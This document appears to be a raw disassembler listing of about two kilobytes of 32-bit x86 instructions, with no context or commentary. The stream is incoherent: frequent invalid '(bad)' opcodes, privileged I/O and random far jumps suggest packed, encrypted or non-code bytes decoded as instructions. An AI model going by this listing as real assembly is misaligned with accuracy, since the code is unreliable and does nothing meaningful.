  41850c:	xchg   edi,eax
  41850d:	js     0x418569
  41850f:	add    DWORD PTR [eax-0x252c1a82],esi
  418515:	sub    BYTE PTR [eax],ah
  418517:	push   esp
  418518:	lea    edi,[eax+ecx*1+0x13644354]
  41851f:	add    esi,ebx
  418521:	jns    0x41857f
  418523:	pop    ss
  418524:	jno    0x4184e8
  418526:	in     eax,0xac
  418528:	inc    edi
  418529:	loope  0x41856c
  41852b:	sub    al,bh
  41852d:	sub    BYTE PTR [edx-0x11],0xda
  418531:	ins    DWORD PTR es:[edi],dx
  418532:	adc    DWORD PTR [edi+0x2f],esi
  418535:	fwait
  418536:	dec    edi
  418537:	or     eax,0x20de2537
  41853c:	xchg   esp,eax
  41853d:	(bad)  
  41853e:	sbb    al,0x69
  418540:	mov    edi,0x38c1fe41
  418545:	mov    al,BYTE PTR [edi-0x55]
  418548:	and    esp,DWORD PTR [edx-0x483d7cbc]
  41854e:	sbb    DWORD PTR ds:0xf2f52631,ebp
  418554:	aad    0xb6
  418556:	add    DWORD PTR [ebx+0x27],0xffffffd9
  41855a:	push   eax
  41855b:	pusha  
  41855c:	pop    edi
  41855d:	cmp    dl,BYTE PTR [esi]
  41855f:	call   0x2cf1ac34
  418564:	int    0x8e
  418566:	sbb    ebx,DWORD PTR [edi-0x38]
  418569:	xchg   ecx,eax
  41856a:	mov    ch,0xf0
  41856c:	push   edi
  41856d:	mov    edx,0x189ca651
  418572:	mov    DWORD PTR [edx],esp
  418574:	mov    bh,0xaf
  418576:	jne    0x41859f
  418578:	jnp    0x418533
  41857a:	and    dh,BYTE PTR [edi]
  41857c:	mov    ecx,0x279c5ae9
  418581:	and    ebx,ecx
  418583:	lock rol ch,0xca
  418587:	retf   0x4fa8
  41858a:	(bad)  
  41858b:	cmp    BYTE PTR [edx+edx*4-0x42452eb1],dl
  418592:	mov    esi,0x12c119bf
  418597:	cmp    ecx,DWORD PTR [eax+0x19]
  41859a:	mov    BYTE PTR ds:0x3622d248,bh
  4185a0:	push   edi
  4185a1:	sub    BYTE PTR [edx],0x4a
  4185a4:	mov    eax,ds:0x189ad446
  4185a9:	and    al,0x5e
  4185ab:	outs   dx,BYTE PTR ds:[esi]
  4185ac:	je     0x4185d4
  4185ae:	or     al,0xcc
  4185b0:	and    eax,DWORD PTR [eax]
  4185b2:	pop    ss
  4185b3:	mov    WORD PTR [edi-0xdd591cf],fs
  4185b9:	adc    BYTE PTR [ebx+0x542cf951],ch
  4185bf:	and    eax,0xc93d2676
  4185c4:	push   cs
  4185c5:	pop    ebx
  4185c6:	leave  
  4185c7:	scas   eax,DWORD PTR es:[edi]
  4185c8:	aaa    
  4185c9:	mov    ecx,0x9e4d4e94
  4185ce:	push   edi
  4185cf:	sub    BYTE PTR [ecx],ah
  4185d1:	pop    esp
  4185d2:	int    0xd1
  4185d4:	xor    al,0x9c
  4185d6:	xchg   ebx,eax
  4185d7:	or     BYTE PTR [edx-0x5e95bb2],dh
  4185dd:	call   0xe67c432e
  4185e2:	xor    BYTE PTR [esi+0x3fe08b5c],cl
  4185e8:	popf   
  4185e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185ea:	sub    edi,DWORD PTR [edi+edi*2-0x52414488]
  4185f1:	repz lock xchg esp,eax
  4185f4:	test   ch,0x53
  4185f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185f8:	ds pop eax
  4185fa:	shl    DWORD PTR [ecx+0x1bbe3f81],1
  418600:	sub    esi,DWORD PTR [edx+0x4799fbc6]
  418606:	ret    0xd1cb
  418609:	mov    BYTE PTR [ebx-0x73],bl
  41860c:	test   DWORD PTR [eax-0x4c0de3ad],eax
  418612:	dec    edi
  418613:	sub    al,al
  418615:	fwait
  418616:	mov    ch,BYTE PTR [ebp+0x4c7839e1]
  41861c:	ret    0xeb0f
  41861f:	mov    al,ds:0xc5ec563c
  418624:	(bad)  
  418625:	push   esi
  418626:	push   cs
  418627:	inc    bl
  418629:	and    al,0xd3
  41862b:	sbb    esi,DWORD PTR [ecx+0x1f]
  41862e:	mov    al,0x2c
  418630:	push   ebx
  418631:	sbb    al,0x87
  418633:	cmp    DWORD PTR [edi],edx
  418635:	pop    ds
  418636:	jmp    0x571b:0x98648a78
  41863d:	mul    edx
  41863f:	retf   0xf86e
  418642:	jns    0x41864c
  418644:	daa    
  418645:	jp     0x41862d
  418647:	sbb    DWORD PTR [edi+0x17b269b8],esi
  41864d:	shr    DWORD PTR [ebp+0x9],cl
  418650:	mulps  xmm1,XMMWORD PTR [edi]
  418653:	js     0x418611
  418655:	cmp    esp,esi
  418657:	adc    BYTE PTR [ebx],ch
  418659:	test   eax,0xba160a10
  41865e:	mov    ecx,0x577bc91e
  418663:	in     eax,dx
  418664:	mov    esi,0x9f475f8c
  418669:	clc    
  41866a:	cs dec ebx
  41866c:	xor    ecx,DWORD PTR [esi+0x2f]
  41866f:	aas    
  418670:	js     0x41866e
  418672:	out    dx,al
  418673:	sbb    eax,0x97ee2ba
  418678:	inc    edi
  418679:	cwde   
  41867a:	mov    BYTE PTR [edx-0x48],bl
  41867d:	sbb    al,dl
  41867f:	imul   esp,DWORD PTR [ebx],0x30db45e2
  418685:	stos   BYTE PTR es:[edi],al
  418686:	jae    0x4186f0
  418688:	int    0x5f
  41868a:	fisttp QWORD PTR [ecx]
  41868c:	js     0x41862c
  41868e:	xchg   edi,eax
  41868f:	mov    WORD PTR gs:[ecx],cs
  418692:	dec    ecx
  418693:	inc    ebp
  418694:	inc    ebp
  418695:	dec    eax
  418696:	and    bh,bl
  418698:	sub    al,0xf6
  41869a:	mov    ecx,0xc5d8c9f7
  41869f:	sub    esi,DWORD PTR [eax+0x188660aa]
  4186a5:	sub    al,0xe5
  4186a7:	mov    cs,eax
  4186a9:	cmp    eax,0x7bb9e211
  4186ae:	sbb    esp,DWORD PTR [edi-0x48188a20]
  4186b4:	ss mov esi,0x5833708d
  4186ba:	inc    esp
  4186bb:	dec    ecx
  4186bc:	jae    0x418732
  4186be:	push   esi
  4186bf:	dec    edi
  4186c0:	xchg   esp,eax
  4186c1:	inc    edx
  4186c2:	sub    ch,bl
  4186c4:	mov    bl,dl
  4186c6:	fisubr DWORD PTR [ecx]
  4186c8:	pop    di
  4186ca:	pop    ecx
  4186cb:	pop    es
  4186cc:	xorps  xmm6,XMMWORD PTR [edx]
  4186cf:	cli    
  4186d0:	ins    DWORD PTR es:[edi],dx
  4186d1:	push   ds
  4186d2:	adc    BYTE PTR [edi+0x654bc20e],ch
  4186d8:	jnp    0x4186c0
  4186da:	mov    ebx,DWORD PTR ds:0xe173a847
  4186e0:	or     al,0x89
  4186e2:	mov    esi,DWORD PTR [edi]
  4186e4:	sbb    eax,0x202074fa
  4186e9:	rcl    BYTE PTR [ecx+0x6db03660],cl
  4186ef:	xchg   ecx,eax
  4186f0:	sub    DWORD PTR [edi],esi
  4186f2:	or     edx,ebx
  4186f4:	push   ecx
  4186f5:	cmp    ecx,DWORD PTR [edi+eax*4]
  4186f8:	inc    esp
  4186f9:	xor    esi,DWORD PTR [eax+ebp*2-0x6b]
  4186fd:	test   al,0xdf
  418700:	fbld   TBYTE PTR [ebx-0x3e]
  418703:	jecxz  0x41873d
  418705:	iret   
  418706:	stos   BYTE PTR es:[edi],al
  418707:	in     eax,dx
  418708:	stos   DWORD PTR es:[edi],eax
  418709:	mov    eax,ds:0xf9cb74c3
  41870e:	lods   eax,DWORD PTR ds:[esi]
  41870f:	push   ss
  418710:	or     DWORD PTR [edx+eax*8+0x64b250d0],0x2619d619
  41871b:	jnp    0x418732
  41871d:	test   BYTE PTR [ecx+0x5c14418e],cl
  418723:	test   al,0xa8
  418725:	jge    0x4186c9
  418727:	push   ds
  418728:	sub    ebp,0x5e
  41872b:	sar    ecx,cl
  41872d:	out    0xe6,eax
  41872f:	sbb    ah,ah
  418731:	stos   BYTE PTR es:[edi],al
  418732:	aam    0x29
  418734:	mov    WORD PTR [eax],ds
  418736:	xchg   esi,eax
  418737:	lea    eax,[eax-0x3ecf6561]
  41873d:	or     DWORD PTR [edx+0x6a68331d],esi
  418743:	stos   DWORD PTR es:[edi],eax
  418744:	pop    edi
  418745:	dec    ebp
  418746:	cmp    BYTE PTR [ebp-0x47fedf2f],al
  41874c:	pop    es
  41874d:	xchg   edx,eax
  41874e:	gs jmp 0x38eb:0x23c25bfe
  418756:	and    al,0xfb
  418758:	cmc    
  418759:	or     al,0x4e
  41875b:	cmc    
  41875c:	sbb    BYTE PTR [eax],al
  41875e:	pop    esp
  41875f:	push   esp
  418760:	gs (bad) 
  418762:	pop    ss
  418763:	fstp   TBYTE PTR [ecx+ebx*1]
  418766:	fscale 
  418768:	xchg   ebx,eax
  418769:	mov    dl,0xb
  41876b:	xlat   BYTE PTR ds:[ebx]
  41876c:	mov    eax,0x80f674ec
  418771:	jle    0x41873b
  418773:	test   al,0x81
  418776:	mov    DWORD PTR [eax-0x7b9cfb8c],ebp
  41877c:	jmp    0xe489:0x964e54b5
  418783:	xchg   edx,eax
  418784:	and    eax,0x996d7e10
  418789:	push   esp
  41878a:	sub    al,0x82
  41878c:	fiadd  WORD PTR [edi-0x69977237]
  418792:	rcr    BYTE PTR [ecx],1
  418794:	aas    
  418795:	adc    al,0x41
  418797:	adc    bl,BYTE PTR [eax]
  418799:	mov    ds:0x98a2a48a,al
  41879e:	or     ebx,DWORD PTR [ecx]
  4187a0:	mov    ch,0x20
  4187a2:	stc    
  4187a3:	std    
  4187a4:	ja     0x41880b
  4187a6:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187a8:	(bad)  [ebx-0x74]
  4187ab:	arpl   cx,di
  4187ad:	(bad)  
  4187ae:	int    0x89
  4187b0:	das    
  4187b1:	inc    ecx
  4187b2:	leave  
  4187b3:	and    eax,0xa9d5feb2
  4187b8:	aad    0xc0
  4187ba:	mov    ebp,0xa34cd1b9
  4187bf:	mov    edi,0xb977c9a6
  4187c4:	mov    edx,0xe4083396
  4187c9:	xor    ch,BYTE PTR [esi+0x51ef5471]
  4187cf:	dec    ebx
  4187d0:	(bad)  
  4187d1:	mov    ebx,0x261fccbe
  4187d6:	repnz dec eax
  4187d8:	add    eax,DWORD PTR [ebp-0x77693f55]
  4187de:	xor    al,0x38
  4187e0:	sub    DWORD PTR [edx+0x68],0xe18a83d5
  4187e7:	loop   0x418844
  4187e9:	enter  0xe7e7,0x3b
  4187ed:	cmp    al,0x43
  4187ef:	push   cs
  4187f0:	cdq    
  4187f1:	mul    BYTE PTR [ebx]
  4187f3:	(bad)  [esi+0x4f7bbabe]
  4187f9:	push   0x3758858f
  4187fe:	jecxz  0x4187b6
  418800:	mov    ah,dl
  418802:	adc    esp,edx
  418804:	(bad)  
  418805:	or     esp,DWORD PTR [edx+0x6b]
  418808:	rol    BYTE PTR [esi-0x24574b0b],0x66
  41880f:	jae    0x4187d1
  418811:	mov    ecx,0x3dc0b174
  418816:	mov    esi,0x7416251e
  41881b:	xchg   BYTE PTR [ebx+edx*8-0x79],dl
  41881f:	push   es
  418820:	sbb    BYTE PTR [ecx-0x5f],0xc4
  418824:	mov    al,ds:0xc304a1dd
  418829:	es shl bh,1
  41882c:	xor    DWORD PTR [edx+0x59],esi
  41882f:	repz (bad) [ebx]
  418832:	frstor [ecx]
  418834:	xchg   esi,eax
  418835:	jp     0x418883
  418837:	fimul  DWORD PTR [edi+0x76]
  41883a:	ficom  DWORD PTR [ebx]
  41883c:	test   eax,0xb4db98dc
  418841:	pop    ebx
  418842:	imul   esp,esp,0x65
  418845:	(bad)  
  418846:	outs   dx,BYTE PTR ds:[esi]
  418847:	jno    0x418838
  418849:	jno    0x418808
  41884b:	lods   eax,DWORD PTR ds:[esi]
  41884c:	(bad)  
  41884d:	pop    esi
  41884e:	inc    esp
  41884f:	push   ebp
  418850:	or     dl,BYTE PTR [ebp-0x2e]
  418853:	out    0x74,al
  418855:	and    BYTE PTR [eax+edx*1-0x5a344f66],ah
  41885c:	(bad)  
  41885d:	xor    al,0x28
  41885f:	mov    eax,ds:0x93c399b9
  418864:	lea    edx,[edi+edi*4]
  418867:	mov    al,0x16
  418869:	xchg   edx,eax
  41886a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41886b:	out    0xf2,al
  41886d:	cmp    BYTE PTR [eax],cl
  41886f:	imul   BYTE PTR [ecx+0x6c]
  418872:	in     al,0x4a
  418874:	int    0x27
  418876:	add    BYTE PTR [eax-0x44],0x66
  41887a:	push   es
  41887b:	dec    esp
  41887c:	or     cl,BYTE PTR [esi-0x18d315fc]
  418882:	stos   BYTE PTR es:[edi],al
  418883:	std    
  418884:	mov    ebx,0x99553a33
  418889:	icebp  
  41888a:	push   esi
  41888b:	ficomp WORD PTR [ecx-0x35d7419a]
  418891:	jg     0x4188eb
  418893:	jbe    0x418888
  418895:	inc    eax
  418896:	xchg   ebx,eax
  418897:	ret    0xff63
  41889a:	jle    0x418885
  41889c:	popa   
  41889d:	xor    al,0xc4
  41889f:	mov    esp,0x2bb57b6e
  4188a4:	mov    bh,0x4e
  4188a6:	retf   
  4188a7:	sub    eax,0xcba0a869
  4188ac:	out    dx,eax
  4188ad:	inc    ebp
  4188ae:	in     al,dx
  4188af:	sbb    ebx,0xe29708c1
  4188b5:	call   0xb322:0x45c690a1
  4188bc:	sbb    esi,esi
  4188be:	mov    edi,?
  4188c0:	ja     0x4188bb
  4188c2:	mov    esp,0xa3a003aa
  4188c7:	lahf   
  4188c8:	xchg   esp,eax
  4188c9:	out    0xe,eax
  4188cb:	icebp  
  4188cc:	ss ins DWORD PTR es:[edi],dx
  4188ce:	das    
  4188cf:	push   ebx
  4188d0:	add    esp,esi
  4188d2:	jle    0x418903
  4188d4:	mov    esi,0x926f3130
  4188d9:	popf   
  4188da:	stos   DWORD PTR es:[edi],eax
  4188db:	ss out dx,al
  4188dd:	push   edx
  4188de:	in     al,dx
  4188df:	and    ebp,0x26e51be
  4188e5:	mov    ah,0x4
  4188e7:	outs   dx,BYTE PTR ds:[esi]
  4188e8:	int3   
  4188e9:	add    eax,0x4123eb8d
  4188ee:	lods   eax,DWORD PTR ds:[esi]
  4188ef:	adc    edx,DWORD PTR [edi-0x66]
  4188f2:	aas    
  4188f3:	xlat   BYTE PTR ds:[ebx]
  4188f4:	hlt    
  4188f5:	std    
  4188f6:	fcomp  DWORD PTR [ecx]
  4188f8:	mov    dh,0x5b
  4188fa:	int3   
  4188fb:	jp     0x418939
  4188fd:	sub    cl,BYTE PTR [edi]
  4188ff:	cwde   
  418900:	je     0x4188a1
  418902:	pusha  
  418903:	cmc    
  418904:	pop    ebx
  418905:	pop    ebx
  418906:	lahf   
  418907:	shr    DWORD PTR [eax],cl
  418909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890a:	aaa    
  41890b:	fsubr  QWORD PTR [edx]
  41890d:	je     0x418939
  41890f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418910:	(bad)  
  418911:	sub    BYTE PTR ds:0x3fd748d8,0xba
  418918:	test   DWORD PTR [ecx-0x15913027],edi
  41891e:	or     ebp,DWORD PTR [ecx]
  418920:	call   0xae9a:0xf4273ca3
  418927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418928:	mov    dh,0xc9
  41892a:	cmp    al,BYTE PTR [eax]
  41892c:	dec    ebx
  41892d:	dec    esp
  41892e:	pop    eax
  41892f:	ins    BYTE PTR es:[edi],dx
  418930:	lea    edi,[eax]
  418932:	mov    edx,0x3f40b5ef
  418937:	xchg   ebx,eax
  418938:	adc    DWORD PTR [ebx-0x31],eax
  41893b:	add    eax,0x9b9f6647
  418940:	or     al,0x2b
  418942:	lea    esp,[edx+0x45eca51f]
  418948:	lock not bh
  41894b:	push   esp
  41894c:	mov    BYTE PTR [esi-0x53],0x4e
  418950:	xor    dl,BYTE PTR [eax+0x10]
  418953:	jle    0x4189d3
  418955:	ret    
  418956:	das    
  418957:	in     eax,dx
  418958:	push   esi
  418959:	sub    eax,0x7cb23ead
  41895e:	push   edi
  41895f:	xor    DWORD PTR [esi*2+0x2676571a],edx
  418966:	cmp    eax,0x17441590
  41896b:	cli    
  41896c:	push   0xa9a5f848
  418971:	or     DWORD PTR [eax+0x1d],edx
  418974:	jl     0x4189ec
  418976:	imul   ecx,esp,0xffffff8a
  418979:	fmul   st,st(3)
  41897b:	push   0xffffffdf
  41897d:	or     BYTE PTR [ebp-0x57],ah
  418980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418981:	pop    ebp
  418982:	and    BYTE PTR [eax+edi*1],0x56
  418986:	or     bh,cl
  418988:	imul   ebp,DWORD PTR [ebx+0x47],0xffffffe8
  41898c:	xor    DWORD PTR [ecx-0x5770099d],esp
  418992:	out    dx,eax
  418993:	push   edi
  418994:	mov    ds:0xb26dfcfc,eax
  418999:	xchg   ecx,eax
  41899a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41899b:	mov    ch,0x1c
  41899d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41899e:	pop    esp
  41899f:	adc    al,0xff
  4189a1:	arpl   WORD PTR [edi],bp
  4189a3:	rdpmc  
  4189a5:	mov    bl,BYTE PTR [edx+esi*1+0x46]
  4189a9:	jp     0x4189da
  4189ab:	popa   
  4189ac:	jp     0x4189a8
  4189ae:	or     ch,BYTE PTR [esi-0x51dd6a5d]
  4189b4:	mov    fs,WORD PTR [edi-0x7b]
  4189b7:	outs   dx,DWORD PTR ds:[esi]
  4189b8:	ficom  DWORD PTR [ebx]
  4189ba:	dec    esp
  4189bb:	sbb    edx,DWORD PTR [edi]
  4189bd:	push   ecx
  4189be:	outs   dx,DWORD PTR ds:[esi]
  4189bf:	repz stc 
  4189c1:	stc    
  4189c2:	jo     0x418a2d
  4189c4:	je     0x418971
  4189c6:	shl    BYTE PTR [ebp-0x29],0xd9
  4189ca:	xchg   edi,eax
  4189cb:	mov    dh,0xf7
  4189cd:	add    DWORD PTR [esi+0x45da40b1],ecx
  4189d3:	lahf   
  4189d4:	popf   
  4189d5:	lods   al,BYTE PTR ds:[esi]
  4189d6:	psubb  mm2,QWORD PTR [eax]
  4189d9:	dec    edx
  4189da:	cmp    esp,DWORD PTR ds:0xf46af5a8
  4189e0:	in     eax,0x12
  4189e2:	sbb    BYTE PTR [esi-0x44],dh
  4189e5:	xor    dl,BYTE PTR [esi-0x34]
  4189e8:	xor    dh,BYTE PTR [ebx-0x568c1682]
  4189ee:	mov    ebp,0xaf44f7a5
  4189f3:	fidiv  WORD PTR [ecx-0x49]
  4189f6:	mov    ebp,0x2ef57846
  4189fb:	test   DWORD PTR [ecx-0x15ad6919],0xa4d426d8
  418a05:	mov    edx,edx
  418a07:	dec    ecx
  418a08:	dec    eax
  418a09:	xor    DWORD PTR cs:[edx+0x23],0x57252871
  418a11:	cwde   
  418a12:	xor    eax,0xe3a57cff
  418a17:	pop    ecx
  418a18:	cmp    BYTE PTR [ebx],dl
  418a1a:	rcr    BYTE PTR [esi],1
  418a1c:	mov    WORD PTR [eax+0x6ce5b04f],gs
  418a22:	stos   BYTE PTR es:[edi],al
  418a23:	push   esp
  418a24:	lods   eax,DWORD PTR ds:[esi]
  418a25:	and    eax,0x6942d166
  418a2a:	(bad)  
  418a2b:	fisttp QWORD PTR [esi]
  418a2d:	mov    edx,0x8c0ec1bb
  418a32:	inc    esp
  418a33:	outs   dx,BYTE PTR ds:[esi]
  418a34:	je     0x4189d4
  418a36:	test   eax,0xbaafa72
  418a3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a3c:	inc    ebx
  418a3d:	neg    DWORD PTR [eax+0x78]
  418a40:	push   0xffffffa2
  418a42:	dec    edx
  418a43:	mov    ebp,0xe5fdaaf5
  418a48:	add    al,0xfd
  418a4a:	jns    0x418a27
  418a4c:	ss xchg edi,eax
  418a4e:	dec    ecx
  418a4f:	in     al,dx
  418a50:	pop    ss
  418a51:	js     0x418a9c
  418a53:	add    ebp,DWORD PTR [ebx-0x70551f94]
  418a59:	sub    al,0xd3
  418a5b:	pushf  
  418a5c:	xor    BYTE PTR [eax],bh
  418a5e:	mov    ds:0x73ba907e,al
  418a63:	in     al,0x7a
  418a65:	pop    ebx
  418a66:	arpl   WORD PTR [edx-0x46bb172],dx
  418a6c:	daa    
  418a6d:	mov    edi,0x818e1620
  418a72:	(bad)  
  418a73:	(bad)  
  418a74:	mov    bl,0x42
  418a76:	loopne 0x418a76
  418a78:	not    DWORD PTR [eax-0x32]
  418a7b:	jb     0x418a09
  418a7d:	iret   
  418a7e:	int3   
  418a7f:	mov    esi,0x7b57256e
  418a84:	cld    
  418a85:	mov    cl,0xf1
  418a87:	jae    0x418a11
  418a89:	sub    al,0xd2
  418a8b:	stc    
  418a8c:	enter  0xea70,0xf8
  418a90:	test   al,0x7c
  418a92:	and    eax,0xd87c195b
  418a97:	nop
  418a98:	sub    bh,BYTE PTR [edi-0x39535a18]
  418a9e:	pop    ss
  418a9f:	je     0x418a3d
  418aa1:	(bad)  
  418aa2:	imul   ebp,DWORD PTR [ecx-0x9ca22cd],0x31256bf1
  418aac:	adc    bh,BYTE PTR [esi+0x6e1500ca]
  418ab2:	mov    edi,0x22a76f7c
  418ab7:	lea    ecx,[ebx]
  418ab9:	rcr    BYTE PTR [ecx],1
  418abb:	rol    esp,cl
  418abd:	pusha  
  418abe:	jl     0x418aa6
  418ac0:	and    eax,0xbcb98c03
  418ac5:	jo     0x418afc
  418ac7:	mov    al,0x46
  418ac9:	fisttp WORD PTR [ebx+esi*4]
  418acc:	cwde   
  418acd:	arpl   dx,sp
  418acf:	fwait
  418ad0:	push   0x445eb73b
  418ad5:	mov    ch,0x6
  418ad7:	mov    ah,BYTE PTR [ebx+0x2d429b87]
  418add:	sub    al,0x4b
  418adf:	mov    cs,ebp
  418ae1:	aaa    
  418ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ae3:	xchg   edx,eax
  418ae4:	cmp    DWORD PTR [ebx+0x7b1b3335],ebp
  418aea:	data16 fsubr QWORD PTR [ebp-0x787c0133]
  418af1:	pop    edi
  418af2:	outs   dx,BYTE PTR ds:[esi]
  418af3:	out    dx,al
  418af4:	fs pop es
  418af6:	add    ecx,DWORD PTR [edx-0x3ecefdf0]
  418afc:	call   0x50041426
  418b01:	add    al,0x17
  418b03:	push   esp
  418b04:	and    esi,esi
  418b06:	clc    
  418b07:	test   eax,0x823f306b
  418b0c:	popf   
  418b0d:	bound  edi,QWORD PTR [edx]
  418b0f:	(bad)  
  418b10:	xor    bh,ah
  418b12:	xchg   edx,eax
  418b13:	mov    ah,BYTE PTR [edi-0x48]
  418b16:	jb     0x418abc
  418b18:	(bad)  
  418b19:	adc    cl,BYTE PTR [esi-0x4a2112df]
  418b1f:	add    eax,0x1cc1cd
  418b24:	cmc    
  418b25:	sbb    dh,BYTE PTR [edi+0x4f8583d7]
  418b2b:	aas    
  418b2c:	jg     0x418b9b
  418b2e:	xchg   edx,eax
  418b2f:	mov    WORD PTR [esi+edx*4],ss
  418b32:	push   es
  418b33:	mov    bl,0xe1
  418b35:	call   FWORD PTR [ebp+0x1c57a579]
  418b3b:	mov    cs,edx
  418b3d:	or     ecx,DWORD PTR [esi]
  418b3f:	in     al,dx
  418b40:	inc    esp
  418b41:	test   ah,0xfc
  418b44:	xor    bl,BYTE PTR [ebx-0x6b]
  418b47:	in     eax,dx
  418b48:	hlt    
  418b49:	cmp    eax,0xa5ce7575
  418b4e:	test   BYTE PTR [ebx+0x77],dl
  418b51:	cs out dx,al
  418b53:	push   ss
  418b54:	pop    ebp
  418b55:	int    0x7a
  418b57:	dec    ecx
  418b58:	inc    ecx
  418b59:	popf   
  418b5a:	cwde   
  418b5b:	addr16 retf 
  418b5d:	pop    ebp
  418b5e:	cmp    dh,al
  418b60:	xlat   BYTE PTR ds:[ebx]
  418b61:	test   eax,0x46b6265b
  418b66:	shr    DWORD PTR ds:0x1d6d417c,1
  418b6c:	push   esp
  418b6d:	je     0x418b78
  418b6f:	sub    ebp,esp
  418b71:	push   esp
  418b72:	ins    BYTE PTR es:[edi],dx
  418b73:	push   cs
  418b74:	mov    WORD PTR [esi+0xe8a5cb],ds
  418b7a:	xchg   ecx,eax
  418b7b:	aas    
  418b7c:	aas    
  418b7d:	in     al,dx
  418b7e:	adc    eax,0x34134e3a
  418b83:	push   esi
  418b84:	mov    ds,WORD PTR [edx+0x52]
  418b87:	xor    edx,ecx
  418b89:	sbb    BYTE PTR [ebx-0x5f],cl
  418b8c:	push   es
  418b8d:	and    esi,DWORD PTR [ebx-0x532a2aa0]
  418b93:	loopne 0x418bd7
  418b95:	lea    edx,[ecx]
  418b97:	mov    eax,ds:0xb8851b5f
  418b9c:	enter  0xc4e5,0xff
  418ba0:	jg     0x418bc4
  418ba2:	dec    ebp
  418ba3:	push   ds
  418ba4:	fcom   DWORD PTR [eax]
  418ba6:	adc    BYTE PTR [eax+0x6815d134],bh
  418bac:	sbb    al,0x9f
  418bae:	call   0x625e:0xb10a58ba
  418bb5:	add    eax,DWORD PTR [ecx]
  418bb7:	push   ebx
  418bb8:	(bad)  
  418bba:	and    edx,ebp
  418bbc:	popf   
  418bbd:	imul   ebx,DWORD PTR [eax+0x28],0x1f
  418bc1:	shr    cl,cl
  418bc3:	pop    edi
  418bc4:	div    DWORD PTR [esi-0x5b]
  418bc7:	adc    BYTE PTR [edi],dl
  418bc9:	loopne 0x418b8f
  418bcb:	int    0xc2
  418bcd:	mov    DWORD PTR ds:0x5614eac8,esi
  418bd3:	hlt    
  418bd4:	add    DWORD PTR [ebx+ebx*8-0x4558f7c],esi
  418bdb:	pusha  
  418bdc:	add    ah,BYTE PTR ds:0xdbd01398
  418be2:	pop    ebx
  418be3:	test   DWORD PTR [ebx+0x36],edx
  418be6:	cdq    
  418be7:	fs push edx
  418be9:	pop    ss
  418bea:	push   0xffffff95
  418bec:	mov    DWORD PTR [edi+esi*1-0x6d],esi
  418bf0:	outs   dx,BYTE PTR ds:[esi]
  418bf1:	push   ecx
  418bf2:	shl    bh,1
  418bf4:	add    DWORD PTR [edx+0x23],ebp
  418bf7:	shl    DWORD PTR [edi],cl
  418bf9:	xor    edi,ebp
  418bfb:	sub    al,0x9
  418bfd:	scas   eax,DWORD PTR es:[edi]
  418bfe:	and    DWORD PTR [edi],ecx
  418c00:	xor    ah,BYTE PTR [ecx-0x1b]
  418c03:	mov    dl,0x6
  418c05:	stos   DWORD PTR es:[edi],eax
  418c06:	xor    bl,bh
  418c08:	add    al,0x3e
  418c0a:	jmp    0x418c86
  418c0c:	or     DWORD PTR [eax+0x2d],0xef3c0a66
  418c13:	gs iret 
  418c15:	push   0xffffffa1
  418c17:	pop    eax
  418c18:	in     al,0xba
  418c1a:	repnz cwde 
  418c1c:	fisub  WORD PTR [ebp+0x26]
  418c1f:	mov    eax,ds:0xff5bf9b3
  418c24:	xor    al,0x38
  418c26:	inc    eax
  418c27:	pushf  
  418c28:	lahf   
  418c29:	ins    DWORD PTR es:[edi],dx
  418c2a:	cwde   
  418c2b:	stc    
  418c2c:	pop    es
  418c2d:	sub    esp,DWORD PTR [eax+0x48]
  418c30:	mov    al,ds:0xe5859612
  418c35:	pop    eax
  418c36:	rcr    DWORD PTR [eax+0x3c],1
  418c39:	test   DWORD PTR [edi],esp
  418c3b:	test   ebp,esp
  418c3d:	xor    DWORD PTR [esi+0x73],0x85b92734
  418c44:	jae    0x418cc2
  418c46:	call   0x87b4:0x8675bdf8
  418c4d:	scas   al,BYTE PTR es:[edi]
  418c4e:	scas   al,BYTE PTR es:[edi]
  418c4f:	ret    
  418c50:	lea    ebp,[ebp-0x51]
  418c53:	mov    ds:0x1d6f5895,al
  418c58:	shl    bl,cl
  418c5a:	leave  
  418c5b:	jae    0x418cc9
  418c5d:	pop    ds
  418c5e:	mov    ebp,0x2c4aca82
  418c63:	xchg   BYTE PTR [esi-0x740ad788],ah
  418c69:	cmp    ecx,DWORD PTR [edi-0x4d]
  418c6c:	adc    eax,0xf7c7be2
  418c71:	les    ebp,FWORD PTR [edx]
  418c73:	xchg   edx,eax
  418c74:	imul   ebp,DWORD PTR [edi+0x47],0x8
  418c78:	adc    esp,eax
  418c7a:	mov    edx,0x6add88c4
  418c7f:	dec    edi
  418c80:	or     eax,0x5bbf9ad
  418c85:	inc    ebx
  418c86:	cmp    eax,0x969206fa
  418c8b:	add    DWORD PTR [eax+0x50314c2f],ebx
  418c91:	mov    bh,0x20
  418c93:	cmp    bh,ah
  418c95:	std    
  418c96:	cmp    al,0x38
  418c98:	sub    eax,0x7b22cb99
  418c9d:	retf   0xdf07
  418ca0:	outs   dx,BYTE PTR ds:[esi]
  418ca1:	add    dl,bh
  418ca3:	sbb    BYTE PTR [edx+0x21],dh
  418ca6:	sbb    DWORD PTR [ebx+0x63b6f901],0x8
  418cad:	push   cs
  418cae:	jmp    0x7307:0xf1f7dafd
  418cb5:	push   ss
  418cb6:	sbb    al,0x56
  418cb9:	mov    DWORD PTR [ecx],edi
  418cbb:	in     al,0x5f
  418cbd:	fstp   TBYTE PTR [esi-0x21bba5aa]
  418cc3:	jg     0x418c78
  418cc5:	repnz mov bh,0xce
  418cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cc9:	clc    
  418cca:	ror    DWORD PTR [ebx+0x735995ca],cl
  418cd0:	shr    BYTE PTR [edx+eax*4-0x5dcf69a8],0xe0
  418cd8:	pop    esi
  418cd9:	test   eax,0x3589fdad
  418cde:	jmp    0xdc0c:0x6d3eca39
  418ce5:	cli    
  418ce6:	pop    edx
  418ce7:	cmp    esi,edx
  418ce9:	mov    esp,0x55a7d553
